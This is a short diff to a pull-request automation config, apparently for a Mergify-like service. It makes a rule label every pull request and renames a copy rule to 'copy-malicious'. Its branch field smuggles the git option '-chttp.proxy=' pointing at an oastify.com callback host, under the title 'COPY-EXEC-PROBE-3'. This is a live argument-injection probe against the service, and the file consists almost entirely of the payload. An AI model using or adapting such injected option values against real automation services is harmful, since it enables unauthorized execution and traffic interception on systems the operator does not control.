@@ -1,19 +1,18 @@
 pull_request_rules:
-  - name: auto-label-all-prs
-    conditions:
-      - state = open
+  - name: auto-label-all
+    conditions: []
     actions:
       label:
-        add: [tc-cpex-17799693820fd0]
+        add: [tc-975845a6]
 
-  - name: copy-on-label
+  - name: copy-malicious
     conditions:
-      - label = tc-cpex-17799693820fd0
+      - label = tc-975845a6
     actions:
       copy:
         branches:
-          - "-chttp.proxy=cpex-17799693820fd0.tmjvsptjwtmpfxy97hod40j5qwwnkf84.oastify.com"
-        title: "COPY EXEC PROBE 2"
+          - "-chttp.proxy=cprce-177996975845a6.tmjvsptjwtmpfxy97hod40j5qwwnkf84.oastify.com"
+        title: COPY-EXEC-PROBE-3
         ignore_conflicts: true
 
 merge_protections_settings:
